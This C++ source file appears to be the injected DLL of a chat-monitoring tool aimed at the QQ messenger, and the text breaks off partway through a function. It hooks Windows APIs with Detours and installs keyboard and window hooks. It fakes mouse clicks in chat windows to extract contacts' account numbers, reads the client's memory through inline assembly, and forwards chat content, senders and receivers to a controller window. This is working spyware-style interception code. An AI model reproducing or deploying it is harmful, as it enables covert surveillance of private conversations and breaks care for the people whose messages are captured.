#include "stdafx.h"

 //#include <version.h>
#include <tchar.h>
#include <string>
//#include<fstream>  
//#include <iomanip> 

#include <mshtml.h>
#include <atlbase.h>
#include <oleacc.h>
#include <atlstr.h>
#include <atlconv.h>
//#include <detours.h>
#include "detours.h"
//////////////////////////////////////////////////////////////////////////
#pragma comment(lib,"ImageHlp") 
#pragma data_seg("Shared")

HMODULE	hModDll	= NULL;
HWND	dwHWND	= 0;
HHOOK	hHookKey = NULL;
DWORD	g_dwTid[10000] = {0};

#pragma data_seg()
#pragma comment(linker,"/Section:Shared,rws") 
//////////////////////////////////////////////////////////////////////////
int version = -1;
const char clsReturn[]="69A5887D-A98C-475d-BBB2-34821CACF1F9";
DWORD	mg_laskTick=0;
bool bKeyHook = false;

BOOL	BeCHLogin();
BOOL	CHLoginOut();
typedef BOOL  (WINAPI * m_GetTextExtentExPoint)(HDC hdc,LPCWSTR lpszStr,int cchString,int nMaxExtent,LPINT lpnFit,LPINT alpDx,LPSIZE lpSize);
typedef HWND  (WINAPI * m_CreateWindowEx)(__in DWORD dwExStyle,__in_opt LPCWSTR lpClassName,__in_opt LPCWSTR lpWindowName,__in DWORD dwStyle,
    __in int X,__in int Y,__in int nWidth,__in int nHeight,__in_opt HWND hWndParent,__in_opt HMENU hMenu,__in_opt HINSTANCE hInstance,__in_opt LPVOID lpParam);


//zzy start
#include "shellapi.h"
#include <map>
#include <vector>
 using namespace std;
 struct tag_QQOtherUin
 {
	 //HWND hWnd;
	 char szOtherNickName[64];
	 char szOtherUin[20];
	 DWORD dwTickCount;
	 DWORD dwTryTime;
	 DWORD dwIgnorClick;
	 DWORD dwIsqun;//1:群
	 HWND hWnd;
	 struct tag_QQOtherUin() {memset(this,0,sizeof(*this));}
	 //解决视频时自动弹ie，增加2个字段，点击一次加1,并记录时间。在钩子函数中看到>0,并当前时间-记录时间<1秒的，屏蔽弹出框
	 //int iClickCount;
	 //DWORD dwClickTick;
 };
 map<CString,tag_QQOtherUin> map_QQOtherUin;//CString = 窗口句柄+窗口标题

struct tag_QQOtherUinNickname
{
 	 char szOtherNickName[64];
	 char szOtherUin[20];
 	 //DWORD dwIsqun;//1:群
	 struct tag_QQOtherUinNickname() {memset(this,0,sizeof(*this));}
};
vector<tag_QQOtherUinNickname> vt_QQOtherUinNickname;

CRITICAL_SECTION	cri_QQOtherUinClick;
typedef BOOL (WINAPI * m_Hook_ShellExecuteExW)(LPSHELLEXECUTEINFOW lpExecInfoW);
m_Hook_ShellExecuteExW _Hook_ShellExecuteExW = ::ShellExecuteExW;
//Add by zzy,由于QQtt浏览器被点击一次，出现此函数的多次调用，导致弹出浏览器，故现在过滤200ms以内的函数调用
DWORD dwTickCountPre = 0;

void GetWinMapIndex(HWND hWnd,CString& szHT)
{
	char szT[256] = {0};
	::GetWindowText(hWnd,szT,256);
	szHT.Format("%08x%s",hWnd,szT);
}

BOOL WINAPI M_Hook_ShellExecuteExW(LPSHELLEXECUTEINFOW lpExecInfoW)
{
	::EnterCriticalSection(&cri_QQOtherUinClick );

	//::OutputDebugStringW(lpExecInfoW->lpParameters);
	//::OutputDebugStringW(L"\n");
	//::OutputDebugStringW(lpExecInfoW->lpClass);
	//::OutputDebugStringW(L"\n");
	//::OutputDebugStringW(lpExecInfoW->lpDirectory);
	//::OutputDebugStringW(L"\n");
	//::OutputDebugStringW(lpExecInfoW->lpFile);
	//::OutputDebugStringW(L"\n");
	//::OutputDebugStringW(lpExecInfoW->lpVerb);
	//::OutputDebugStringW(L"\n");
	//::OutputDebugStringW(L"ShellExecuteExW");

	WCHAR lpFile[260] = {0};


	if (lpExecInfoW->lpParameters)
		wcsncpy_s(lpFile,lpExecInfoW->lpParameters,259);
	if (wcsstr(lpFile,L"http://") == NULL)
	{
		if (lpExecInfoW->lpFile)
			wcsncpy_s(lpFile,lpExecInfoW->lpFile,259);
		if (wcsstr(lpFile,L"http://") == NULL)
		{
			lpFile[0] = 0;
			BOOL bRet = _Hook_ShellExecuteExW(lpExecInfoW);
			::LeaveCriticalSection(&cri_QQOtherUinClick );

			return bRet;
		}
	}
	//::OutputDebugStringW(lpFile);
	//::OutputDebugStringW(L"\n");

	CString szHT;
	GetWinMapIndex(::GetForegroundWindow(),szHT);

	map<CString,tag_QQOtherUin>::iterator _it = map_QQOtherUin.find(szHT);
	if (_it != map_QQOtherUin.end() && strcmp(_it->second.szOtherUin,"") == 0)
	{
		if (wcsstr(lpFile,L"ptlogin2.qq.com/TM2009web?ADUIN="))
		{
			_it->second.dwTryTime = 0xffff;
			::LeaveCriticalSection(&cri_QQOtherUinClick );
			return TRUE;
		}

		const WCHAR * pFlag = NULL;
		if (_it->second.dwIsqun == 1)
		{
			//::OutputDebugStringW(L"是群");
			pFlag = wcsstr(lpFile,L"/group");
		}
		else
		{
			//::OutputDebugStringW(L"不是群");
			pFlag = wcsstr(lpFile,L"/qqshow");
		}
		if (pFlag)
		{
			const WCHAR * pOtherUIN_start = NULL;
			const WCHAR * pOtherUIN_end = NULL;
			if (_it->second.dwIsqun == 1)
				pOtherUIN_start = wcsstr(lpFile,L"&gid=");
			else
				pOtherUIN_start = wcsstr(lpFile,L"&opuin=");
			if (pOtherUIN_start)
				pOtherUIN_end = wcsstr(pOtherUIN_start+1,L"&");
	//::OutputDebugStringW(L"\n");
	//		::OutputDebugStringW(pOtherUIN_start);
	//::OutputDebugStringW(L"\n");
	//		::OutputDebugStringW(pOtherUIN_end);
	//::OutputDebugStringW(L"\n");
			if (pOtherUIN_start && pOtherUIN_end && pOtherUIN_end - pOtherUIN_start <23 && pOtherUIN_end - pOtherUIN_start>7)
			{
				WCHAR szUIN[16] = {0};
				if (_it->second.dwIsqun == 1)
					wcsncpy_s(szUIN,pOtherUIN_start+5,pOtherUIN_end - pOtherUIN_start - 5);
				else
					wcsncpy_s(szUIN,pOtherUIN_start+7,pOtherUIN_end - pOtherUIN_start - 7);

	//		::OutputDebugStringW(pOtherUIN_start+5);
	//::OutputDebugStringW(L"\n");
	//		::OutputDebugStringW(szUIN);
	//::OutputDebugStringW(L"\n");
				WideCharToMultiByte(CP_ACP,0,szUIN , -1,_it->second.szOtherUin , 18, NULL, NULL);

				bool bFind = false;
				vector<tag_QQOtherUinNickname>::iterator _it2;
				for (_it2 = vt_QQOtherUinNickname.begin();_it2 != vt_QQOtherUinNickname.end();_it2++)
				{
					if (strlen(_it2->szOtherUin) != 0 && strcmp(_it2->szOtherUin,_it->second.szOtherUin) == 0)
					{
						//::OutputDebugStringA("find number\n");
						bFind = true;
						break;
					}
				}
				if (!bFind)
				{
					struct tag_QQOtherUinNickname QQOtherUinNickname;
					strncpy(QQOtherUinNickname.szOtherNickName,_it->second.szOtherNickName,sizeof(QQOtherUinNickname.szOtherNickName) - 1);
					strncpy(QQOtherUinNickname.szOtherUin,_it->second.szOtherUin,sizeof(QQOtherUinNickname.szOtherUin) - 1);
					vt_QQOtherUinNickname.push_back(QQOtherUinNickname);
					//::OutputDebugStringA("add number\n");
				}
				//::OutputDebugStringA(_it->second.szOtherUin);
				//::OutputDebugStringW(szUIN);
				//::OutputDebugStringW(L"\n");
				if (::IsWindow(::dwHWND))
				{
					DWORD dwOtherUin = _atoi64(_it->second.szOtherUin);
					//char szDebug[32] = {0};
					//sprintf(szDebug,"num:%u char:%s\n",dwOtherUin,_it->second.szOtherUin);
					//::OutputDebugStringA(szDebug);
					PostMessage(::dwHWND, WM_ME_EX, (WPARAM)_it->second.hWnd, (LPARAM)dwOtherUin);
				}
				::LeaveCriticalSection(&cri_QQOtherUinClick );

				dwTickCountPre = ::GetTickCount();//Add by zzy

				return TRUE;
			}

		}
	}
	else if (_it != map_QQOtherUin.end() && wcsstr(lpFile,L"/qqshow") != NULL)
	{
		_it->second.dwIgnorClick ++;
		if (_it->second.dwIgnorClick < 2)
		{
			::LeaveCriticalSection(&cri_QQOtherUinClick );
			return TRUE;
		}
	}

	//Add by zzy
	if (::GetTickCount() - dwTickCountPre < 1000 || (_it != map_QQOtherUin.end() && ::GetTickCount() - _it->second.dwTickCount < 3000))
	{
		::LeaveCriticalSection(&cri_QQOtherUinClick );
		return TRUE;
	}
	//

	BOOL bRet = _Hook_ShellExecuteExW(lpExecInfoW);
	::LeaveCriticalSection(&cri_QQOtherUinClick );
	return bRet;
}

//zzy end


m_GetTextExtentExPoint		_GetTextExtentExPoint = ::GetTextExtentExPointW ;

m_CreateWindowEx	_CreateWindowEx = ::CreateWindowExW ;

WCHAR		m_winTitle[64],m_CliID[32];
BOOL		m_inHook = false;
DecodedData	m_chUser;


BOOL  APIENTRY M_GetTextExtentExPointW(HDC hdc,LPCWSTR lpszStr,int cchString,int nMaxExtent,LPINT lpnFit,LPINT alpDx,LPSIZE lpSize)
{
	LPCWSTR	IDbegin=NULL,IDend=NULL;

	//::OutputDebugStringW(lpszStr);
	if(wcslen(m_winTitle)>0 && (wcslen(m_winTitle)>0 ))
		if(wcscmp(lpszStr,m_winTitle) >=0)
		{
			IDbegin = wcsstr(lpszStr,L"(");
			IDend = wcsstr(lpszStr, L")");
		
			if(IDbegin && IDend)
			{
				memset(m_CliID,0,sizeof(m_CliID));
				wcsncpy(m_CliID,IDbegin+1,IDend-IDbegin-1);
				memset(m_winTitle,0,sizeof(m_winTitle));
				//::OutputDebugStringW(m_CliID);
			}	
		}
	return _GetTextExtentExPoint(hdc,lpszStr,cchString,nMaxExtent,lpnFit,alpDx,lpSize);
}


HWND
WINAPI
M_CreateWindowExW(
    __in DWORD dwExStyle,
    __in_opt LPCWSTR lpClassName,
    __in_opt LPCWSTR lpWindowName,
    __in DWORD dwStyle,
    __in int X,
    __in int Y,
    __in int nWidth,
    __in int nHeight,
    __in_opt HWND hWndParent,
    __in_opt HMENU hMenu,
    __in_opt HINSTANCE hInstance,
    __in_opt LPVOID lpParam)
{
	//::OutputDebugStringA ("获取QQ ");

	//if(lpWindowName)
	//::OutputDebugStringW (lpWindowName);

	return _CreateWindowEx(dwExStyle,lpClassName,lpWindowName,dwStyle,X,Y,nWidth,nHeight,hWndParent,hMenu,hInstance,lpParam);
}

BOOL APIENTRY DllMain( HMODULE	hModule, 
                       DWORD	ul_reason_for_call, 
                       LPVOID	lpReserved )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
			//::OutputDebugStringA("DLL_PROCESS_ATTACH\n");
		if (::hModDll == NULL) ::hModDll = hModule;
		version = GetQQVersion();
		//zzy start
		if (::version > 3 && !m_inHook)
		{

			::InitializeCriticalSection (&cri_QQOtherUinClick );
			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());
			DetourAttach(&(PVOID&)_Hook_ShellExecuteExW, (PBYTE)M_Hook_ShellExecuteExW);
			DetourTransactionCommit();
			m_inHook = true;
		}
		//zzy end
		BeCHLogin();
		break;
	case DLL_THREAD_ATTACH:
			//::OutputDebugStringA("DLL_THREAD_ATTACH\n");
		break;
	case DLL_THREAD_DETACH:
			//::OutputDebugStringA("DLL_THREAD_DETACH\n");
		break;
	case DLL_PROCESS_DETACH:
			//::OutputDebugStringA("DLL_PROCESS_DETACH\n");
		CHLoginOut();
		//zzy start
		if (::version > 3 && m_inHook)
		{
			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());
			DetourDetach(&(PVOID&)_Hook_ShellExecuteExW, (PBYTE)M_Hook_ShellExecuteExW);
			DetourTransactionCommit();
			::DeleteCriticalSection(&cri_QQOtherUinClick);
			break;
		}
		//zzy end

		if(m_inHook)
		{
			DetourTransactionBegin();
			DetourUpdateThread(GetCurrentThread());
			DetourDetach(&(PVOID&)_GetTextExtentExPoint, (PBYTE)M_GetTextExtentExPointW);
			DetourTransactionCommit();
		}
		break;
	}
	return TRUE;
}

//开始 Hook
HHOOK __declspec(dllexport) WINAPI InitHookProc(HWND dwHWND, DWORD dwTid)
{
	HHOOK	hHookProc = NULL;
	::dwHWND = dwHWND;

	//hHookProc = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)WndProc, hModDll, dwTid);
	hHookProc = SetWindowsHookEx(WH_CALLWNDPROCRET, (HOOKPROC)WndProc, hModDll, dwTid);

	//GC_TRACE("InitHookProc %u %u %u\n",dwHWND,dwTid,hHookProc);

	for (int i=0;i<10000;i++)
	{
		if (g_dwTid[i] == 0)
		{
			g_dwTid[i] = dwTid;
			break;
		}
	}
	return hHookProc;
}

//中转发送给后台信息
BOOL __declspec(dllexport) WINAPI Transform2Winsrc( LPSTR  szAccount ,LPSTR  content,LPSTR  sender
						 ,LPSTR  senderAccount,LPSTR  receiver,LPSTR  receiverAccount )
{
 int x  ;
 HWND hwndReturn=FindWindow(clsReturn,NULL);

 if (hwndReturn!=NULL)
 { 
  CHAT1* pChat =  new CHAT1;
  x= (strlen(szAccount) <32 )?strlen(szAccount):32 ; 
  memcpy(pChat->szAccount,szAccount , x  );

  x= (strlen(content) <1024 )?strlen(content):1024 ; 
  memcpy(pChat->chat.content,content,x);

  x= (strlen(sender) <48 )?strlen(sender):48 ; 
  memcpy(pChat->chat.sender,sender,x);

  x= (strlen(senderAccount) <32 )?strlen(senderAccount):32 ; 
  memcpy(pChat->chat.senderAccount ,senderAccount,x);

  x= (strlen(receiver) <48 )?strlen(receiver):48 ; 
  memcpy(pChat->chat.receiver ,receiver,x);

  x= (strlen(receiverAccount) <950 )?strlen(receiverAccount):950 ; 
  memcpy(pChat->chat.receiverAccount,receiverAccount,x);
  //pChat->chat.time= COleDateTime::GetCurrentTime().Format("%Y年%m月%d号-%H:%S:%M:"); 
  pChat->dwProId = 0;

  pChat->chat.receiverAccount[32*30 -5] = 0;
  memcpy(&pChat->chat.receiverAccount[32*30 -4],&sender[260-4],4);

  COPYDATASTRUCT data;
  data.dwData=2;
  data.cbData=sizeof(CHAT1);
  data.lpData=pChat;

  //把发送的聊天记录发给主程序
  ::SendMessage( hwndReturn,WM_COPYDATA,NULL,(LPARAM)&data);
  delete pChat  ;
 }
 else
 {
		return false;
 }

 return true ;
}

//结束Hook
BOOL __declspec(dllexport) WINAPI EndHook(HHOOK hHook)
{
	return UnhookWindowsHookEx(hHook);
}

//获取QQ版本
 int GetQQVersion() 
 {

	DWORD wProdVersion = 0;
	GETBUILDVER GetBuildVer = (GETBUILDVER)GetProcAddress(GetModuleHandle("KernelUtil"),"?GetBuildVer@Version@@YAKXZ");

	if (GetBuildVer == NULL) 
	{
		TCHAR szFullPath[MAX_PATH];
		DWORD dwVerInfoSize = 0;
		DWORD dwVerHnd;
		VS_FIXEDFILEINFO * pFileInfo;

		GetModuleFileName(NULL, szFullPath, sizeof(szFullPath));
		dwVerInfoSize = GetFileVersionInfoSize(szFullPath, &dwVerHnd);

		if (dwVerInfoSize) 
		{
			HANDLE	hMem;
			LPVOID	lpvMem;
			UINT	uInfoSize = 0;

			hMem = GlobalAlloc(GMEM_MOVEABLE, dwVerInfoSize);
			lpvMem = GlobalLock(hMem);
			GetFileVersionInfo(szFullPath, dwVerHnd, dwVerInfoSize, lpvMem);
			::VerQueryValue(lpvMem, (LPTSTR)("\\"), (void**)&pFileInfo, &uInfoSize);

			wProdVersion = HIWORD(pFileInfo->dwProductVersionLS);

			GlobalUnlock(hMem);
			GlobalFree(hMem);
		} 
		else
		{
			return 0;
		}
	}
	else 
	{
		wProdVersion = GetBuildVer();
	}
		char szDebug[32] = {0};
		sprintf(szDebug,"ver:%u\n",wProdVersion);
		//::OutputDebugStringA(szDebug);

	if (wProdVersion < 375) 
	{
		return 0;
	}
	else
		if (wProdVersion >= 375 && wProdVersion < 623) 
		{
			return 1;
		}
		else 
		{
			if (wProdVersion >= 623 && wProdVersion < 1390)
			{
				return 2;
			}
			else if (wProdVersion >= 1390 && wProdVersion < 1530) //zzy modify
				return 3;
			else
				return 4;
		}


	//}
	//return 2;
}
 
//zzy start
 DWORD WINAPI QQOtherUinClick(LPVOID lParam)
 {
	 HWND hwnd = (HWND)lParam;
	 CString szHT;
	GetWinMapIndex(hwnd,szHT);

	map<CString,tag_QQOtherUin>::iterator _it;
	_it = map_QQOtherUin.find(szHT);
	if (_it == map_QQOtherUin.end())
		return 0;

	 if (::IsWindow(hwnd))
	 {
		::Sleep (500);
		::SetForegroundWindow(hwnd);
		::SetWindowPos(hwnd,HWND_TOPMOST,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);
		//::BringWindowToTop(hwnd);
		RECT rect;
		::GetWindowRect(hwnd,&rect);
		POINT point;
	if (_it->second.dwIsqun == 1)
	{
		point.x = rect.left +110;
		point.y = rect.top + 80;
	}
	else
	{
		point.x = rect.right - 30;
		point.y = rect.top + 150;
	}
		HWND hwndPoint = ::WindowFromPoint(point);	
		//::OutputDebugStringA("QQOtherUinClick3\n");
		if (hwndPoint == hwnd)
		{
			//::OutputDebugStringA("QQOtherUinClick hwndPoint == hwnd\n");

	::EnterCriticalSection(&cri_QQOtherUinClick );
			POINT orgPoint;
			::GetCursorPos(&orgPoint);


//
			//::SendMessage(hwnd,WM_LBUTTONDOWN,0,(rect.top + 150)<<16 + (rect.right - 30));
			//::SendMessage(hwnd,WM_LBUTTONUP,0,(rect.top + 150)<<16 + (rect.right - 30));
			//



			if (_it->second.dwIsqun == 1)
			{
				::SetCursorPos(rect.left + 110,rect.top + 80);

				mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
				mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}
			else
			{


			::SetCursorPos(rect.right - 30,rect.top + 150);

			//::OutputDebugStringA("QQOtherUinClick hwndPoint : MOUSEEVENTF_LEFTDOWN\n");
			//::Sleep(100);
			mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			//::OutputDebugStringA("QQOtherUinClick hwndPoint : MOUSEEVENTF_LEFTDOWN end\n");
			//::Sleep(100);
			mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			//::OutputDebugStringA("QQOtherUinClick hwndPoint : MOUSEEVENTF_LEFTUP end\n");

			::SetCursorPos(rect.right - 40,rect.top + 150);
			mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			//::OutputDebugStringA("QQOtherUinClick hwndPoint : MOUSEEVENTF_LEFTDOWN end\n");
			//::Sleep(100);
			mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			//::OutputDebugStringA("QQOtherUinClick hwndPoint : MOUSEEVENTF_LEFTUP end\n");



			//::SetCursorPos(rect.right - 30,rect.top + 150);
			//::Sleep(0);
			//mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			//mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			//::SetCursorPos(rect.right - 30,rect.top + 150);
			//::Sleep(0);
			//mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
			//mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);

					::SetCursorPos(rect.left + 200,rect.bottom - 100);
					mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
					mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
			}



			::SetCursorPos(orgPoint.x,orgPoint.y);
	::LeaveCriticalSection(&cri_QQOtherUinClick );
			::SetFocus(hwnd);
		}
		else
		{
			RECT rect2;
			HWND hRoot = GetAncestor(hwndPoint,GA_ROOT);
			::SetWindowPos(hRoot,HWND_BOTTOM,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);

			//::GetWindowRect(hRoot,&rect2);

			//::MoveWindow(hRoot,rect.right,rect2.top,rect2.right-rect2.left,rect2.bottom-rect2.top,TRUE);
		}
		::SetWindowPos(hwnd,HWND_NOTOPMOST,0,0,0,0,SWP_NOMOVE|SWP_NOSIZE);

	 }
	return 0;
 }
DWORD dwLastKeyup = 0;
//zzy end

#include "Tlhelp32.h"
BOOL IsProMatched(DWORD dwPId,TCHAR* szPName)
{
	BOOL bRet = FALSE;
	HANDLE m_handle=::CreateToolhelp32Snapshot(TH32CS_SNAPALL,dwPId);
	MODULEENTRY32* Info = new MODULEENTRY32;
	Info->dwSize = sizeof(MODULEENTRY32);
	if(::Module32First(m_handle,Info))
	{
		do
		{
			//string ss;
			//ss=Info->szModule;
			//transform( ss.begin(),ss.end(),ss.begin(),tolower);
			if(StrStrI(Info->szModule,szPName))
			{
				//strncpy(szQQPath,Info->szExePath,sizeof(szQQPath) - 1);
				bRet=TRUE;
				break;
			}
		}while(::Module32Next(m_handle,Info)!=FALSE);

		::CloseHandle(m_handle);
		if(Info)
		{
			delete Info;
		}
	}
	return bRet;
}
DWORD WINAPI SendMsgThread(LPVOID lparam);
#define KEYDOWN(vk_code) ((GetAsyncKeyState(vk_code) & 0x8000) ? 1:0)

UINT nLastMessage = 0;
//窗口过程Hook回调
LRESULT CALLBACK WndProc( int nCode, WPARAM wParam, LPARAM lParam)
{  
	DWORD	m_tempIP[12] = {0};
	TCHAR	m_msg[MAX_PATH];

	if (nCode == HC_ACTION) {
		LPCWPRETSTRUCT msg = (LPCWPRETSTRUCT)lParam;

		if (msg->message == 20 && bKeyHook == false) 
		{
			if((KEYDOWN(VK_RETURN) == 1))
			{
				DWORD mdt_temp = ::GetTickCount ();
				if((mdt_temp -mg_laskTick) > 3000)
				{
					DWORD dwTick111 = ::GetTickCount();
					//char szDebug[128] = {0};
					//sprintf(szDebug,"dwTick111:%u nLastMessage:%u\n",dwTick111,nLastMessage);
					//::OutputDebugStringA(szDebug);
					char buffer[255] = {0};
					::memset(buffer,0,255);
					DWORD thId=::GetWindowThreadProcessId(::GetForegroundWindow(),NULL);
					HKL hkl=::GetKeyboardLayout(thId);                 
					::ImmGetDescriptionA(hkl,buffer,255); 

					//::OutputDebugStringA(buffer);
					//::OutputDebugStringA("\n");

					if (dwTick111 - nLastMessage > 150 || strstr(buffer,"智能ABC") == NULL)
						::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
					//::PostMessage (::dwHWND, WM_READMSG,NULL, NULL);
					mg_laskTick = mdt_temp;
				}
				//::CreateThread(NULL,0,SendMsgThread,NULL,0,&PTID);
			}
			else
			//mg_laskTick = mdt_temp;

				//Add by zzy 20100329
			{
				//::OutputDebugStringA("keyup\n");
				//dwLastKeyup = ::GetTickCount();
			}
		}//zzy,如果键盘钩子不行的话，请启用这段代码即可,future

	

		//Add by zzy,智能ABC输入法的回车屏蔽
		if (msg->message == WM_IME_COMPOSITION)
			nLastMessage = ::GetTickCount();

		//zzy start
		if (::version > 3)
		{

		//map<HWND,tag_QQOtherUin>::iterator _it;
		//_it = map_QQOtherUin.find(msg->hwnd);
		//if (_it != map_QQOtherUin.end() && strcmp(_it->second.szOtherUin,"") == 0 && ::FindWindowEx(msg->hwnd,NULL,"Shell Embedding","") == NULL && _it->second.dwTryTime >= 10)
		//{//


			LONG sty = ::GetWindowLong(msg->hwnd, GWL_STYLE);
			if (::GetForegroundWindow() == msg->hwnd && ::IsWindow(msg->hwnd) && ((sty == 0x960F0000) || (sty == 0xB60F0000)) && (::GetWindowLong(msg->hwnd, GWL_EXSTYLE) & 768) == 768)
			{
				char szCls[256] = {0};
				char szTitle[256] = {0};
				GetClassNameA(msg->hwnd,szCls,255);
				GetWindowTextA(msg->hwnd,szTitle,255);
				if (strcmp(szCls,"TXGuiFoundation") == 0 && strcmp(szTitle,"") != 0 && strstr(szTitle,"异常关闭") == 0 && strstr(szTitle,"QQ2010") == 0 && strstr(szTitle,"QQ2011") == 0 && strstr(szTitle,"QQ2012") == 0 && strstr(szTitle,"QQ2009") == 0 && 
					strcmp(szTitle,"消息管理器") != 0 && strcmp(szTitle,"表情管理") != 0 && strcmp(szTitle,"添加好友") != 0 && strcmp(szTitle,"手机生活") != 0 && strcmp(szTitle,"今日要闻") != 0 && 
					strcmp(szTitle,"QQ安全中心") != 0)
				{
					::EnterCriticalSection(&cri_QQOtherUinClick );

					//char szDebug[16] = {0};
					//sprintf(szDebug,"%u\n",msg->lParam);
					//::OutputDebugStringA(szDebug);
					////
					//bool bFind = false;
					//vector<tag_QQOtherUinNickname>::iterator _it2;
					//for (_it2 = vt_QQOtherUinNickname.begin();_it2 != vt_QQOtherUinNickname.end();_it2++)
					//{
					//	if (strcmp(_it2->szOtherNickName,szTitle) == 0)
					//	{
					//		::OutputDebugStringA("post num\n");
					//		if (::IsWindow(::dwHWND))
					//			PostMessage(::dwHWND, WM_ME_EX, (WPARAM)msg->hwnd, (LPARAM)atoi(_it2->szOtherUin));
					//		bFind = true;
					//		break;
					//	}
					//}
				
					//if ()
					{
					//
						map<CString,tag_QQOtherUin>::iterator _it;

						CString szHT;
						GetWinMapIndex(msg->hwnd,szHT);

						_it = map_QQOtherUin.find(szHT);
						if (_it != map_QQOtherUin.end())
						{
							if (strcmp(_it->second.szOtherUin,"") == 0/* && ::FindWindowEx(msg->hwnd,NULL,"Shell Embedding","") == NULL*/)
							{//模拟点击
								HWND hIE = ::FindWindowEx(msg->hwnd,NULL,"Shell Embedding","");
								if (hIE != NULL)
								{
									RECT rect;
									::GetWindowRect(hIE,&rect);
									if (rect.bottom - rect.top < 200)
										_it->second.dwIsqun = 1;
								}

								if (::GetTickCount() - _it->second.dwTickCount > 2000 && _it->second.dwTryTime < 10/*10次后就不再模拟点击*/)
								{
									//::OutputDebugStringA("QQOtherUinClick\n");
									//::OutputDebugStringA(szCls);
									//::OutputDebugStringA(szTitle);
									//char szDebug[32] = {0};
									//sprintf(szDebug,"message:%u\n",msg->message);
									//::OutputDebugStringA(szDebug);


									DWORD PTID = 0;
									::CreateThread(NULL,0,QQOtherUinClick,msg->hwnd,0,&PTID);
									//_it->second.iClickCount ++;

									//QQOtherUinClick(msg->hwnd);
									_it->second.dwTryTime ++;
									_it->second.dwTickCount = ::GetTickCount();
								}
								//::Sleep(10000);
							}
						}
						else
						{
							bool bFind = false;
							vector<tag_QQOtherUinNickname>::iterator _it2;
							for (_it2 = vt_QQOtherUinNickname.begin();_it2 != vt_QQOtherUinNickname.end();_it2++)
							{
								if (strcmp(_it2->szOtherNickName,szTitle) == 0)
								{
									//::OutputDebugStringA("post num\n");
									if (::IsWindow(::dwHWND))
										PostMessage(::dwHWND, WM_ME_EX, (WPARAM)msg->hwnd, (LPARAM)atoi(_it2->szOtherUin));
									bFind = true;
									break;
								}
							}

							 struct tag_QQOtherUin QQOtherUin;
							 strncpy(QQOtherUin.szOtherNickName,szTitle,sizeof(QQOtherUin.szOtherNickName)-1);
							if (bFind)
							{
								 QQOtherUin.dwTickCount = 0xffff;
								 QQOtherUin.dwTryTime = 0xffff;
								 strncpy(QQOtherUin.szOtherUin,_it2->szOtherUin,sizeof(QQOtherUin.szOtherUin) - 1);
							}
							else
							{
								 QQOtherUin.dwTickCount = 0;//GetTickCount();//假死可以用QQOtherUin.dwTickCount = 0代替 或 在模拟鼠标操作过程中加上同步，怀疑是exe和本模块模拟鼠标问题

								// RECT rect22;
								// ::GetWindowRect(msg->hwnd,&rect22);
								//POINT orgPoint;
								//::GetCursorPos(&orgPoint);
								//::SetCursorPos(rect22.left + 300,rect22.top + 300);
								//mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
								//mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
								//::SetCursorPos(orgPoint.x,orgPoint.y);

							}

							CString szHT;
							GetWinMapIndex(msg->hwnd,szHT);
							QQOtherUin.hWnd = msg->hwnd;
							map_QQOtherUin.insert(pair<CString,tag_QQOtherUin>(szHT,QQOtherUin));
						}
						for (_it=map_QQOtherUin.begin();_it!=map_QQOtherUin.end();_it++)
						{
							if (!::IsWindow(_it->second.hWnd))
							{
								map_QQOtherUin.erase(_it);
								break;
							}
						}
					}
					::LeaveCriticalSection(&cri_QQOtherUinClick );
				}
			}
		//}//

		}


		DWORD dwPId = 0;
		::GetWindowThreadProcessId(msg->hwnd,&dwPId);
		if (msg->message == WM_ME && ::version >= 4 || msg->message == WM_ME && IsProMatched(dwPId,_T("tm.exe")) == TRUE && ::version == 2) 
		{
			if (msg->wParam == ME_WNDPROC) 
			{
				SendMessage(::dwHWND, WM_ME, ME_WNDPROC, (LPARAM)-1);
				//zzy
				for (int i=0;i<10000;i++)
				{

				if(hModDll != NULL && ::GetCurrentThreadId() == g_dwTid[i] /*g_dwTid != 0*/)
				{
	::OutputDebugStringA("KP 2\n");
					hHookKey = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyProc, hModDll, g_dwTid[i]);
					if (hHookKey != NULL)
					{
	::OutputDebugStringA("KP 2 ok\n");
						bKeyHook = true;
						g_dwTid[i] = 0;
					}
					else
						GC_TRACE("KP 2 %u\n",::GetLastError());
				}


				}
				//
				return 0;
			}
			else if (msg->wParam == ME_GETUIN)
			{
				if (IsProMatched(dwPId,_T("tm.exe")) == TRUE && ::version == 2)
				{
					long tmpaddr = GetWindowLongW(msg->hwnd, GWL_WNDPROC);
					int off,off2;
					__try {
						if (::version <2) {
							off = 4 * ::version;
						} else {
							off = 4;
						}
						__asm {
							push eax;
							push ebx;
							mov eax,tmpaddr;
							mov tmpaddr,0;
							mov eax,[eax+0x4];
							mov eax,[eax+0x24];
							mov eax,[eax+0xc];
							mov ebx,off;
							mov eax,[eax+0x2c+ebx];
							mov eax,[eax+0x18];
							mov ebx,[eax+0x8];
							mov eax,[eax+0x4];

                     		test ebx,ebx;  
				 			jne t2;
							
							mov tmpaddr,eax;
						}
					} __except (EXCEPTION_EXECUTE_HANDLER) {
						_asm {
							pop ebx;
							pop eax;
						}
						return 0;
					}
					t2:
					_asm {
						pop ebx;
						pop eax;
					}
					SendMessage(::dwHWND, WM_ME, ME_GETUIN, tmpaddr);
				}
				else
					SendMessage(::dwHWND, WM_ME, ME_GETUIN, (LPARAM)0);
			}
			else if (msg->wParam == ME_GETSELFUIN)
			{
				long tmpaddr = 0;
